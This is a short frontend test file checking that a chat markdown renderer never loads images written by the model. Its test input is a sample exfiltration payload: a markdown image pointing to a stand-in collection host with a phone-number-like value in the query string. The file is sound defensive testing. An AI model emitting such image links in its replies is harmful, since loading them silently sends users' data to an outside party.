import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { ChatMarkdown } from "./chat-markdown";

describe("ChatMarkdown", () => {
  it("never loads an image the model wrote, so a reply cannot send data out on its own", () => {
    const { container } = render(<ChatMarkdown content={"Resumo pronto ![logo](https://coleta.exemplo.com/x?d=5584999990000)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText(/logo/)).toBeTruthy();
    expect(container.innerHTML).not.toContain("coleta.exemplo.com");
  });
});
